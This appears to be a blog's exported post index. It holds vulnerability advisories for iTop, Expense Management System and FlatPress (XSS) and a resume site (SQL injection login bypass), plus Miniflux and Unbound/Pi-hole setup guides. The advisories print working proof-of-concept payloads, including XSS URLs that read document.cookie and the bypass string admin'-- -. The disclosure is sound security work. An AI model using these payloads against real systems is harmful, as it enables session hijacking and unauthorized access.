[{"content":"Vulnerability Summary A Reflected Cross-Site Scripting (XSS) vulnerability exists in Combodo iTop version \u0026lt; 3.0.4 and \u0026gt;= 3.1.0, \u0026lt; 3.1.1 in the ajax.render.php endpoint. Several query parameters are improperly sanitized, allowing attackers to inject malicious JavaScript code that is reflected in the response and executed in the context of the victim\u0026rsquo;s browser.\nReflected XSS vulnerabilities enable attackers to craft malicious links that, when visited by an authenticated user, trigger arbitrary JavaScript execution. This can lead to session hijacking, information theft, or manipulation of user interactions.\nAffected Parameters The following parameters in the ajax.render.php endpoint are vulnerable:\nparams[order_by] params[limit] params[order_direction] params[group_by_label] params[currentId] CVSS v3.1 Metrics Metric Value Base Score 6.1 (MEDIUM) Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N Weakness Enumeration CWE ID Description CWE-79 Improper Neutralization of Input During Web Page Generation (\u0026lsquo;Cross-site Scripting\u0026rsquo;) Proof of Concept (PoC) Authenticated access is required. Replace \u0026lt;TARGET\u0026gt; with your domain or IP and ensure /itop/ is present in the path.\nTesting Environment iTop version: 3.1.0-2-11973 (built on 2023-08-02 14:25:30) MySQL: 10.3.38-MariaDB-0ubuntu0.20.04.1 PHP: 7.4.3-4ubuntu2.19 Browsers used for testing: Brave 1.58.137 (Chromium 117.0.5938.153) – 64-bit Firefox 118.0.1 – 64-bit PoC #1: params[order_by] http://\u0026lt;TARGET\u0026gt;/itop/pages/ajax.render.php?c[menu]=UserRequest:Overview\u0026amp;filter=[\u0026#34;SELECT `UserRequest` FROM UserRequest AS `UserRequest` WHERE (DATE_SUB(NOW(), INTERVAL 14 DAY) \u0026lt; `UserRequest`.`start_date`)\u0026#34;,[],[]]\u0026amp;id=block_UserRequestOverview_ID_row0_col0_11\u0026amp;operation=chart\u0026amp;params[aggregation_attribute]=\u0026amp;params[aggregation_function]=count\u0026amp;params[chart_type]=pie\u0026amp;params[currentId]=block_UserRequestOverview_ID_row0_col0_11\u0026amp;params[group_by]=UserRequest.request_type\u0026amp;params[group_by_label]=Request Type\u0026amp;params[limit]=\u0026amp;params[order_by]=function\u0026lt;/script\u0026gt;\u0026lt;svg\u0026gt;\u0026lt;script/class=xss-test\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;-\u0026#39;\u0026amp;params[order_direction]=desc PoC #2: params[limit] http://\u0026lt;TARGET\u0026gt;/itop/pages/ajax.render.php?c[menu]=UserRequest:Overview\u0026amp;filter=[\u0026#34;SELECT `UserRequest` FROM UserRequest AS `UserRequest` WHERE (DATE_SUB(NOW(), INTERVAL 14 DAY) \u0026lt; `UserRequest`.`start_date`)\u0026#34;,[],[]]\u0026amp;id=block_UserRequestOverview_ID_row0_col0_11\u0026amp;operation=chart\u0026amp;params[aggregation_attribute]=\u0026amp;params[aggregation_function]=count\u0026amp;params[chart_type]=pie\u0026amp;params[currentId]=block_UserRequestOverview_ID_row0_col0_11\u0026amp;params[group_by]=UserRequest.request_type\u0026amp;params[group_by_label]=Request Type\u0026amp;params[limit]=\u0026lt;/ScriPt\u0026gt;\u0026lt;sCripT id=xss-test\u0026gt;alert(document.cookie)\u0026lt;/sCriPt\u0026gt;\u0026amp;params[order_by]=function\u0026amp;params[order_direction]=desc PoC #3: params[order_direction] http://\u0026lt;TARGET\u0026gt;/itop/pages/ajax.render.php?c[menu]=UserRequest:Overview\u0026amp;filter=[\u0026#34;SELECT `UserRequest` FROM UserRequest AS `UserRequest` WHERE (DATE_SUB(NOW(), INTERVAL 14 DAY) \u0026lt; `UserRequest`.`start_date`)\u0026#34;,[],[]]\u0026amp;id=block_UserRequestOverview_ID_row0_col0_11\u0026amp;operation=chart\u0026amp;params[aggregation_attribute]=\u0026amp;params[aggregation_function]=count\u0026amp;params[chart_type]=pie\u0026amp;params[currentId]=block_UserRequestOverview_ID_row0_col0_11\u0026amp;params[group_by]=UserRequest.request_type\u0026amp;params[group_by_label]=Request Type\u0026amp;params[limit]=\u0026amp;params[order_by]=function\u0026amp;params[order_direction]=desc\u0026lt;/script\u0026gt;\u0026lt;svg\u0026gt;\u0026lt;script/class=xss-test\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;-\u0026#39; PoC #4: params[group_by_label] http://\u0026lt;TARGET\u0026gt;/itop/pages/ajax.render.php?c[menu]=UserRequest:Overview\u0026amp;filter=[\u0026#34;SELECT `UserRequest` FROM UserRequest AS `UserRequest` WHERE (DATE_SUB(NOW(), INTERVAL 14 DAY) \u0026lt; `UserRequest`.`start_date`)\u0026#34;,[],[]]\u0026amp;id=block_UserRequestOverview_ID_row0_col0_11\u0026amp;operation=chart\u0026amp;params[aggregation_attribute]=\u0026amp;params[aggregation_function]=count\u0026amp;params[chart_type]=pie\u0026amp;params[currentId]=block_UserRequestOverview_ID_row0_col0_11\u0026amp;params[group_by]=UserRequest.request_type\u0026amp;params[group_by_label]=Request Type\u0026lt;/script\u0026gt;\u0026lt;svg\u0026gt;\u0026lt;script/class=xss-test\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;-\u0026#39;\u0026amp;params[limit]=\u0026amp;params[order_by]=function\u0026amp;params[order_direction]=desc PoC #5: params[currentId] http://\u0026lt;TARGET\u0026gt;/itop/pages/ajax.render.php?c[menu]=UserRequest:Overview\u0026amp;filter=[\u0026#34;SELECT `UserRequest` FROM UserRequest AS `UserRequest` WHERE (DATE_SUB(NOW(), INTERVAL 14 DAY) \u0026lt; `UserRequest`.`start_date`)\u0026#34;,[],[]]\u0026amp;id=block_UserRequestOverview_ID_row0_col0_11\u0026amp;operation=chart\u0026amp;params[aggregation_attribute]=\u0026amp;params[aggregation_function]=count\u0026amp;params[chart_type]=pie\u0026amp;params[currentId]=block_UserRequestOverview_ID_row0_col0_11\u0026lt;/script\u0026gt;\u0026lt;svg\u0026gt;\u0026lt;script/class=xss-test\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;-\u0026#39;\u0026amp;params[group_by]=UserRequest.request_type\u0026amp;params[group_by_label]=Request Type\u0026amp;params[limit]=\u0026amp;params[order_by]=function\u0026amp;params[order_direction]=desc Suggested Mitigations Properly encode all dynamic content before rendering in HTML. Sanitize user inputs server-side using am HTML sanitization library. Implement Content Security Policy (CSP) headers to mitigate script injection. References https://github.com/Combodo/iTop https://github.com/Combodo/iTop/security/advisories/GHSA-q9cm-q7fc-frxh https://www.cve.org/CVERecord?id=CVE-2023-47622 https://nvd.nist.gov/vuln/detail/CVE-2023-47622 https://portswigger.net/web-security/cross-site-scripting/reflected https://owasp.org/www-community/attacks/xss/ ","permalink":"https://martinkubecka.sk/security-advisories/cve-2023-47622/","summary":"Vulnerability Summary A Reflected Cross-Site Scripting (XSS) vulnerability exists in Combodo iTop version \u0026lt; 3.0.4 and \u0026gt;= 3.1.0, \u0026lt; 3.1.1 in the ajax.render.php endpoint. Several query parameters are improperly sanitized, allowing attackers to inject malicious JavaScript code that is reflected in the response and executed in the context of the victim\u0026rsquo;s browser.\nReflected XSS vulnerabilities enable attackers to craft malicious links that, when visited by an authenticated user, trigger arbitrary JavaScript execution.","title":"CVE-2023-47622: Multiple Reflected Cross-Site Scripting Vulnerabilities in IT Service Management platform iTop"},{"content":"Introduction In recent years, I\u0026rsquo;ve adopted the practice of exploring Privacy Guides and gradually, step by step, substituting proprietary technologies that disregard our privacy with open-source, privacy-respecting alternatives. In this blog post, we will expand our homelab with a minimalist news aggregator known as Miniflux. We\u0026rsquo;ll implement this solution on a Raspberry Pi 4 Model B with 4GB of RAM, running the Raspberry Pi OS Lite.\nThis blog post is structured into four sections: \u0026ldquo;Prerequisites\u0026rdquo; which covers requirements that must be met before we can successfully install and use, \u0026ldquo;Installation\u0026rdquo; providing a step-by-step guide for implementation, \u0026ldquo;Miniflux Usage\u0026rdquo;, and \u0026ldquo;Resources\u0026rdquo; offering supplementary materials. These sections simplify your path from prerequisites to installation, offering valuable resources to aid your exploration.\nPrerequisites Miniflux feed reader provides multiple installation methods, including package installation, Docker container deployment, and manual setup. In our case, we selected Docker due to its user-friendly configuration.\nIf you\u0026rsquo;ve previously installed Docker packages through unofficial distributions in APT, it\u0026rsquo;s necessary to remove these packages before installing the official Docker Engine version. To do this, execute the following command.\nfor pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do sudo apt-get remove $pkg; done To install via the APT repository, begin by configuring the Docker APT repository. Following that, you can install and update Docker directly from the repository.\nSet up Docker\u0026rsquo;s APT repository. sudo apt-get update sudo apt-get install ca-certificates curl gnupg sudo install -m 0755 -d /etc/apt/keyrings curl -fsSL https://download.docker.com/linux/raspbian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg sudo chmod a+r /etc/apt/keyrings/docker.gpg echo \\ \u0026#34;deb [arch=\u0026#34;$(dpkg --print-architecture)\u0026#34; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/raspbian \\ \u0026#34;$(. /etc/os-release \u0026amp;\u0026amp; echo \u0026#34;$VERSION_CODENAME\u0026#34;)\u0026#34; stable\u0026#34; | \\ sudo tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null sudo apt-get update Install the Docker packages. sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin To grant the current user permission to execute docker and, consequently, initiate containers, you need to add them in the docker user group. To make the group change effective, you can either log out and log back in or use the su command.\nsudo usermod -aG docker $USER \u0026amp;\u0026amp; su $USER Installation We will create directory miniflux directory within our home directory using the following command.\nmkdir ~/miniflux You can find a Docker Compose example file on Miniflux\u0026rsquo;s website, and additional examples featuring Traefik and Caddy are available in the project\u0026rsquo;s GitHub repository. For our demonstration, we will use the basic.yml from the mentioned repository. To download this file, execute the following command.\nwget https://raw.githubusercontent.com/miniflux/v2/main/contrib/docker-compose/basic.yml -O ~/miniflux/docker-compose.yml Remember to customize the default password and make any other necessary configurations within the downloaded Docker Compose file, which we have named docker-compose.yml in the previous command.\nRunning the subsequent command will fetch the Docker containers for Miniflux.\ndocker compose -f ~/miniflux/docker-compose.yml -p miniflux pull With the following command we will start Miniflux Docker containers.\ndocker compose -f ~/miniflux/docker-compose.yml -p miniflux up -d To obtain a continuous stream of log output from all services and verify a successful build, run the following command.\ndocker compose -f ~/miniflux/docker-compose.yml -p miniflux logs -f Miniflux Usage You can now access your Miniflux instance at the endpoint determined by your configuration in the ~/miniflux/docker-compose.yml file . For instance, in my setup, I have configured it to operate on port 8080. Thus, visiting http://192.168.100:8080/ will take me to the login portal. Once you input valid user credentials, you will be shown the minimalist Miniflux interface.\nFor a comprehensive user guide covering interface usage, available keyboard shortcuts, filter, rewrite and scraper rules as well as third-party applicationsyou can refer to the official Miniflux website.\nResources Miniflux Website: https://miniflux.app/index.html Miniflux Repository: https://github.com/miniflux Docker Engine Installation on Raspberry Pi: https://docs.docker.com/engine/install/raspberry-pi-os/ Docker Compose Example: https://miniflux.app/docs/dacker.html More Docker Compose Examples: https://github.com/miniflux/v2/tree/main/contrib/docker-compose Miniflux Interface Usage: https://miniflux.app/docs/ui.html Miniflux Keyboard Shortcuts: https://miniflux.app/docs/keyboard_shortcuts.html Miniflux Filter, Rewrite and Scraper Rules: https://miniflux.app/docs/rules.html Miniflux Support for Third-Party Applications: https://miniflux.app/docs/apps.html Thank you for reading, and if you like this post, please consider adding my website to your RSS feed.\n","permalink":"https://martinkubecka.sk/posts/2023-09-23-news-aggregator/","summary":"Introduction In recent years, I\u0026rsquo;ve adopted the practice of exploring Privacy Guides and gradually, step by step, substituting proprietary technologies that disregard our privacy with open-source, privacy-respecting alternatives. In this blog post, we will expand our homelab with a minimalist news aggregator known as Miniflux. We\u0026rsquo;ll implement this solution on a Raspberry Pi 4 Model B with 4GB of RAM, running the Raspberry Pi OS Lite.\nThis blog post is structured into four sections: \u0026ldquo;Prerequisites\u0026rdquo; which covers requirements that must be met before we can successfully install and use, \u0026ldquo;Installation\u0026rdquo; providing a step-by-step guide for implementation, \u0026ldquo;Miniflux Usage\u0026rdquo;, and \u0026ldquo;Resources\u0026rdquo; offering supplementary materials.","title":"Self Hosting News Aggregator"},{"content":"Vulnerability Summary A Stored Cross-Site Scripting (XSS) vulnerability exists in version 1.0 of the Expense Management System application by EGavilan Media that allows for arbitrary execution of JavaScript commands.\nStored XSS vulnerabilities enable attackers to store malicious scripts in a target application. These scripts are then served to users who view the stored data, potentially leading to session hijacking, credential theft, or redirection to malicious sites.\nCVSS v3.1 Metrics Metric Value Base Score 5.4 (MEDIUM) Vector CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N Weakness Enumeration CWE ID Description CWE-79 Improper Neutralization of Input During Web Page Generation (\u0026lsquo;Cross-site Scripting\u0026rsquo;) Proof of Concept (PoC) Steps to Reproduce Download, install, and run the Expense Management System application (version 1.0). Navigate to: http://localhost/index.php Click on Add Expense and fill out the form as follows: Description: \u0026lt;script\u0026gt;alert(document.cookie);\u0026lt;/script\u0026gt; Amount: any numeric value Date: any valid date Press the Save button. Navigate to the page displaying the newly added expense. The JavaScript payload will execute from the description field. Suggested Mitigations Properly encode all dynamic content before rendering in HTML. Sanitize user inputs server-side using am HTML sanitization library. Implement Content Security Policy (CSP) headers to mitigate script injection. References https://github.com/EGavilan-Media/Expense-Management-System https://www.cve.org/CVERecord?id=CVE-2021-41434 https://nvd.nist.gov/vuln/detail/CVE-2021-41434 https://portswigger.net/web-security/cross-site-scripting/stored https://owasp.org/www-community/attacks/xss/ ","permalink":"https://martinkubecka.sk/security-advisories/cve-2021-41434/","summary":"Vulnerability Summary A Stored Cross-Site Scripting (XSS) vulnerability exists in version 1.0 of the Expense Management System application by EGavilan Media that allows for arbitrary execution of JavaScript commands.\nStored XSS vulnerabilities enable attackers to store malicious scripts in a target application. These scripts are then served to users who view the stored data, potentially leading to session hijacking, credential theft, or redirection to malicious sites.\nCVSS v3.1 Metrics Metric Value Base Score 5.","title":"CVE-2021-41434: Stored Cross-Site Scripting Vulnerability in Expense Management System by EGavilan Media"},{"content":"Vulnerability Summary An SQL injection vulnerability exists in the login form of the Resumes Management and Job Application Website application by EGavilan Media. This vulnerability allows unauthenticated attackers to bypass authentication and gain administrative access.\nAn SQL Injection attack consists of inserting an SQL query through client-supplied input into the application\u0026rsquo;s backend query. If improperly sanitized, the attacker may read or modify sensitive data, escalate privileges, or execute system-level commands.\nCVSS v3.1 Metrics Metric Value Base Score 9.8 (CRITICAL) Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Weakness Enumeration CWE ID Description CWE-89 Improper Neutralization of Special Elements used in an SQL Command (\u0026lsquo;SQL Injection\u0026rsquo;) Proof of Concept (PoC) Steps to Reproduce Download, install, and run the Resumes Management and Job Application Website application. Navigate to: http://localhost/login.html Enter the following credentials in the login form: Username: admin'-- - Password: any value Click the Login button. This results in a successful authentication bypass and grants unauthorized access.\nSuggested Mitigations Use prepared statements with parameterized queries. Implement stored procedures for database operations. Apply allow-list input validation on all user input. Escape and sanitize all user-supplied input before processing. References https://github.com/EGavilan-Media/Resumes-Management-and-Job-Application-Website-with-PHP-Bootstrap-and-MySQL https://www.cve.org/CVERecord?id=CVE-2021-41433 https://nvd.nist.gov/vuln/detail/CVE-2021-41433 https://portswigger.net/web-security/sql-injection https://portswigger.net/support/using-sql-injection-to-bypass-authentication ","permalink":"https://martinkubecka.sk/security-advisories/cve-2021-41433/","summary":"Vulnerability Summary An SQL injection vulnerability exists in the login form of the Resumes Management and Job Application Website application by EGavilan Media. This vulnerability allows unauthenticated attackers to bypass authentication and gain administrative access.\nAn SQL Injection attack consists of inserting an SQL query through client-supplied input into the application\u0026rsquo;s backend query. If improperly sanitized, the attacker may read or modify sensitive data, escalate privileges, or execute system-level commands.","title":"CVE-2021-41433: Authentication Bypass in Resumes Management by EGavilan Media"},{"content":"Vulnerability Summary A Stored Cross-Site Scripting (XSS) vulnerability exists in version 1.2.1 of the FlatPress application. This vulnerability allows an authenticated attacker to inject malicious JavaScript code into blog content, which will execute in the context of any user visiting the affected page.\nStored XSS occurs when user-supplied input is stored on the server (e.g., in a database or file system) and later rendered in a web page without proper encoding or sanitization. This can lead to session hijacking, defacement, or redirection to malicious sites.\nCVSS v3.1 Metrics Metric Value Base Score 5.4 (MEDIUM) Vector CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N Weakness Enumeration CWE ID Description CWE-79 Improper Neutralization of Input During Web Page Generation (\u0026lsquo;Cross-site Scripting\u0026rsquo;) Proof of Concept (PoC) Steps to Reproduce Log in to the FlatPress administration area. Navigate to Entries → Write Entry. Enter any value in the Subject field. In the Content area, insert the following payload: \u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt; Click the Save \u0026amp; Continue button. The stored XSS payload is now saved and will be executed whenever the post is viewed. Navigate to the FlatPress homepage to verify the execution of the payload. Suggested Mitigations Properly encode all dynamic content before rendering in HTML. Sanitize user inputs server-side using am HTML sanitization library. Implement Content Security Policy (CSP) headers to mitigate script injection. References https://flatpress.org/ https://www.cve.org/CVERecord?id=CVE-2021-41432 https://nvd.nist.gov/vuln/detail/CVE-2021-41434 https://portswigger.net/web-security/cross-site-scripting/stored https://owasp.org/www-community/attacks/xss/ ","permalink":"https://martinkubecka.sk/security-advisories/cve-2021-41432/","summary":"Vulnerability Summary A Stored Cross-Site Scripting (XSS) vulnerability exists in version 1.2.1 of the FlatPress application. This vulnerability allows an authenticated attacker to inject malicious JavaScript code into blog content, which will execute in the context of any user visiting the affected page.\nStored XSS occurs when user-supplied input is stored on the server (e.g., in a database or file system) and later rendered in a web page without proper encoding or sanitization.","title":"CVE-2021-41432: Stored Cross-Site Scripting Vulnerability in the Blog Content in FlatPress"},{"content":"Introduction Unbound is a validating, recursive, caching open-source DNS resolver primarily developed by NLnet Labs, VeriSign Inc., Nominet, and Kirei. To help increase our online privacy, unbound supports DNS-over-TLS and DNS-over-HTTPS which allows clients to encrypt their communication. Unbound runs on FreeBSD, OpenBSD, NetBSD, MacOS, Linux and Microsoft Windows, with packages available for most platforms.\nThis guide is intended for unbound installation in conjunction with Pi-hole and therefore Pi-hole is the only prerequisite.\nThe Pi-hole is a DNS sinkhole that protects your devices from unwanted content, without installing any client-side software. (documentation)\nYou can install and configure Pi-hole with the command below on any distribution which utilizes systemd or sysvinit. To verify if your distribution is supported, check out Supported Operating Systems section in the Pi-hole documentation. This guide will not go through the Pi-hole installation steps.\n$ curl -sSL https://install.pi-hole.net | bash Personal setup We decided to install unbound on a dedicated system connected directly to our router via ethernet. Here is the complete list of hardware and accessories we have used for this project:\nRaspberry Pi 4 Model B (4GB RAM) OS : Raspberry Pi OS Lite (32-bit) Raspberry Pi 15W USB-C Power Supply Flirc Raspberry Pi 4 Case SanDisk micro SDHC 32 GB Extreme Pro If you are familiar with how does DNS and unbound work, feel free to skip to the Installation section.\nHow does it actually work? In this section, we will learn how does DNS work, what is the difference between recursive and iterative DNS resolver, how does unbound work and what are the pros and the cons of running your own recursive DNS resolver at home.\nHow does DNS actually work? After a user types a domain name (e.g. \u0026ldquo;thehackernews.com\u0026rdquo;) into their browser, DNS lookup is triggered. A group of DNS servers then help to find the IP address for the domain and return it back to the user\u0026rsquo;s computer.\nBecause we will be installing and setting up unbound as a recursive DNS resolver, let\u0026rsquo;s talk about the difference between recursive and iterative DNS resolver.\nRecursive DNS resolver is a middleman between a client (you) and a DNS nameserver. This type of a DNS resolver is recursively querying other DNS servers until it has an IP address for the requested domain, which is returned to the client. If a DNS resolver has already performed the same query in the recent past, this DNS query is cached and when performed again, our resolver respond to us with the cashed data instead of querying other DNS servers.\nHere are other DNS servers that are queried when using a recursive DNS resolver:\nDNS root nameserver responds by directing the recursive resolver to a TLD nameserver, based on the extension of that domain (.com, .net, .org, etc.) DNS TLD nameserver maintains information for all the domain names that share a common domain extension (.com, .net, .org, etc.) DNS authoritative nameserver contains information specific to the domain name it serves and it also provides a recursive resolver with the IP address of that server found in the DNS A record if the domain has a CNAME record it will provide the recursive resolver with an alias domain which means the recursive resolver will have to perform a new DNS lookup for this record Let\u0026rsquo;s visualize what a DNS lookup looks like when a client is using a recursive DNS resolver.\nOn the other hand, when using an iterative DNS resolver client will allow a DNS server to return the best answer it can. If the queried DNS server does not have a match for the query name, it will return a referral to a DNS server authoritative for a lower level of the domain namespace. The DNS client will then make a query to the referral address. This process continues with additional DNS servers down the query chain until either an error or timeout occurs.\nNow let\u0026rsquo;s visualize what a DNS lookup looks like when a client is using a iterative DNS resolver.\nHow does unbound work? In a few steps below, we will describe what are the differences when running only a Pi-hole and a Pi-hole with unbound.\nStandard Pi-hole configuration:\nClient asks the Pi-hole who is domain.com . Pi-hole will check its cache and reply if the answer is known. Pi-hole will check the blocking lists and reply if the domain is blocked. If neither 2. nor 3. point is true, the Pi-hole forwards the DNS request to the configured upstream DNS (usually it is default one from your ISP) When Pi-hole receives the answer, it will reply to a client with the answer. Lastly, Pi-hole will cache the answer so it will be able to respond faster next time a client queries the same domain. Pi-hole setup with unbound as a local recursive DNS resolver:\nClient asks the Pi-hole who is domain.com . Pi-hole will check its cache and reply if the answer is known. Pi-hole will check the blocking lists and reply if the domain is blocked. If neither 2. nor 3. point is true, the Pi-hole forwards the DNS request to the local recursive DNS resolver = unbound. Unbound will send a query to the DNS root servers asking who is handling .com . The root server answers with a referral to the TLD (Top level domain) server for .com . Unbound will send a query to one of the TLD DNS server for .com asking who is handling domain.com . The TLD server answers with a referral to the authoritative name servers for domain.com . Unbound will send a query to the authoritative name servers asking what is the IP for domain.com . The authoritative server will answer with the IP address of the domain domain.com . Unbound will send the reply to Pi-hole which will reply with the answer to a client. Lastly, Pi-hole will cache the answer so it will be able to respond faster next time a client queries the same domain. Pros and Cons Pros Privacy : Directly contacting the responsive servers means that no server can fully log the exact paths you\u0026rsquo;re going (e.g. Google DNS servers will only be asked if you want to visit a Google website). Cons When traversing the path for the first, especially visiting a website for the first time, it may be slower than when we are using big DNS providers which have answers for common used domains cached. The first request to a formerly unknown TLD may take up to a second. Subsequent requests to domains under the same TLD usually complete in \u0026lt; 0.1s. Fortunately, our setup will be configured for efficient caching to minimize the number of queries that will actually have to be performed. Installation Unbound can be simply installed from a package manager with the command below, if you are using apt as a package manager.\n$ sudo apt install unbound Or you can download unbound from Github and then compile and install it with the following command.\n$ ./configure \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install If you are not installing unbound from a package manager, you have to download the current root hints file (list of primary root servers). After downloading this file, you will need to uncomment the root-hints: configuration line in the suggested config file provided below.\n$ wget https://www.internic.net/domain/named.root -qO- | sudo tee /var/lib/unbound/root.hints\nAdd a cronjob or run this command roughly every six months to update the root.hints file.\nConfiguration Now we need to create a config file called pi-hole.conf in /etc/unbound/unbound.conf.d/ directory. Run the following command to create such a file and then copy the content of suggested config file provided to us from an official unbound documentation.\n$ sudo nano /etc/unbound/unbound.conf.d/pi-hole.conf Suggested config file\n# Unbound config file server: # If no logfile is specified, syslog is used # logfile: \u0026#34;/var/log/unbound/unbound.log\u0026#34; verbosity: 0 interface: 127.0.0.1 port: 5335 do-ip4: yes do-udp: yes do-tcp: yes # May be set to yes if you have IPv6 connectivity do-ip6: no # You want to leave this to no unless you have *native* IPv6. With 6to4 and # Terredo tunnels your web browser should favor IPv4 for the same reasons prefer-ip6: no # Use this only when you downloaded the list of primary root servers! # If you use the default dns-root-data package, unbound will find it automatically #root-hints: \u0026#34;/var/lib/unbound/root.hints\u0026#34; # Trust glue only if it is within the server\u0026#39;s authority harden-glue: yes # Require DNSSEC data for trust-anchored zones, if such data is absent, the zone becomes BOGUS harden-dnssec-stripped: yes # Don\u0026#39;t use Capitalization randomization as it known to cause DNSSEC issues sometimes # see https://discourse.pi-hole.net/t/unbound-stubby-or-dnscrypt-proxy/9378 for further details use-caps-for-id: no # Reduce EDNS reassembly buffer size. # IP fragmentation is unreliable on the Internet today, and can cause # transmission failures when large DNS messages are sent via UDP. Even # when fragmentation does work, it may not be secure; it is theoretically # possible to spoof parts of a fragmented DNS message, without easy # detection at the receiving end. Recently, there was an excellent study # \u0026gt;\u0026gt;\u0026gt; Defragmenting DNS - Determining the optimal maximum UDP response size for DNS \u0026lt;\u0026lt;\u0026lt; # by Axel Koolhaas, and Tjeerd Slokker (https://indico.dns-oarc.net/event/36/contributions/776/) # in collaboration with NLnet Labs explored DNS using real world data from the # the RIPE Atlas probes and the researchers suggested different values for # IPv4 and IPv6 and in different scenarios. They advise that servers should # be configured to limit DNS messages sent over UDP to a size that will not # trigger fragmentation on typical network links. DNS servers can switch # from UDP to TCP when a DNS response is too big to fit in this limited # buffer size. This value has also been suggested in DNS Flag Day 2020. edns-buffer-size: 1232 # Perform prefetching of close to expired message cache entries # This only applies to domains that have been frequently queried prefetch: yes # One thread should be sufficient, can be increased on beefy machines. In reality for most users running on small networks or on a single machine, it should be unnecessary to seek performance enhancement by increasing num-threads above 1. num-threads: 1 # Ensure kernel buffer is large enough to not lose messages in traffic spikes so-rcvbuf: 1m # Ensure privacy of local IP ranges private-address: 192.168.0.0/16 private-address: 169.254.0.0/16 private-address: 172.16.0.0/12 private-address: 10.0.0.0/8 private-address: fd00::/8 private-address: fe80::/10 After saving pi-hole.conf configuration file, we will start our local DNS recursive server with the command below.\n$ sudo service unbound restart Testing DNS lookup Finally, we will test our unbound recursive DNS resolver with a dig command querying a DNS record for a pi-hole.net domain. Notice status value NOERROR and the IP address for our requested domain.\n$ dig pi-hole.net @127.0.0.1 -p 5335 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.22-Raspbian \u0026lt;\u0026lt;\u0026gt;\u0026gt; pi-hole.net @127.0.0.1 -p 5335 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 6970 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 1232 ;; QUESTION SECTION: ;pi-hole.net. IN A ;; ANSWER SECTION: pi-hole.net. 300 IN A 3.18.136.52 ;; Query time: 19 msec ;; SERVER: 127.0.0.1#5335(127.0.0.1) ;; WHEN: Thu Jan 27 18:41:51 CET 2022 ;; MSG SIZE rcvd: 56 Testing DNSSEC Last step before changing our network settings will be testing DNSSEC validation using once again dig command.\nThe first command should give us a status report of SERVFAIL and no IP address.\n$ dig sigfail.verteiltesysteme.net @127.0.0.1 -p 5335 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.22-Raspbian \u0026lt;\u0026lt;\u0026gt;\u0026gt; sigfail.verteiltesysteme.net @127.0.0.1 -p 5335 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: SERVFAIL, id: 22604 ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 1232 ;; QUESTION SECTION: ;sigfail.verteiltesysteme.net. IN A ;; Query time: 299 msec ;; SERVER: 127.0.0.1#5335(127.0.0.1) ;; WHEN: Thu Jan 27 18:03:00 CET 2022 ;; MSG SIZE rcvd: 57 The second command should give us NOERROR and IP address.\n$ dig sigok.verteiltesysteme.net @127.0.0.1 -p 5335 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.22-Raspbian \u0026lt;\u0026lt;\u0026gt;\u0026gt; sigok.verteiltesysteme.net @127.0.0.1 -p 5335 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 64024 ;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 1232 ;; QUESTION SECTION: ;sigok.verteiltesysteme.net. IN A ;; ANSWER SECTION: sigok.verteiltesysteme.net. 60 IN A 134.91.78.139 ;; Query time: 29 msec ;; SERVER: 127.0.0.1#5335(127.0.0.1) ;; WHEN: Thu Jan 27 18:03:15 CET 2022 ;; MSG SIZE rcvd: 71 Pi-hole settings In your Pi-hole web console, navigate to the Settings, then DNS. Make sure to uncheck all upstream DNS servers.\nNow, scroll down to the second Upstream DNS Servers section and specify 127.0.0.1#5335 as the Custom DNS (IPv4). This means that your Pi-hole will use your recursive DNS server provided by unbound.\nAt last, scroll all the way down and save your settings. After pressing the Save button you should see a pop up Info window\nValidating our setup At the time of writing this post, we have been running Pi-hole with unbound for almost 24 hours. We are able to validate that our configuration works from the Upstream servers pie chart, where 65% of all the DNS queries were handled by our local recursive DNS resolver and 20% were cached queries. Remaining 15% of DNS queries were handled by our preconfigured Quad9 upstream server and other public resolver while we were configuring local recursive DNS resolver unbound.\nResources Pi-hole - documentation : https://docs.pi-hole.net/ unbound - about : https://nlnetlabs.nl/projects/unbound/about/ unbound - install : https://docs.pi-hole.net/guides/dns/unbound/ What is DNS? : https://www.cloudflare.com/learning/dns/what-is-dns/ What is recursive DNS? : https://www.cloudflare.com/learning/dns/what-is-recursive-dns/ DNS server types : https://www.cloudflare.com/learning/dns/dns-server-types/ Thank you for reading and we hope you learned something new._\n","permalink":"https://martinkubecka.sk/posts/2022-01-28-resursive-dns/","summary":"Introduction Unbound is a validating, recursive, caching open-source DNS resolver primarily developed by NLnet Labs, VeriSign Inc., Nominet, and Kirei. To help increase our online privacy, unbound supports DNS-over-TLS and DNS-over-HTTPS which allows clients to encrypt their communication. Unbound runs on FreeBSD, OpenBSD, NetBSD, MacOS, Linux and Microsoft Windows, with packages 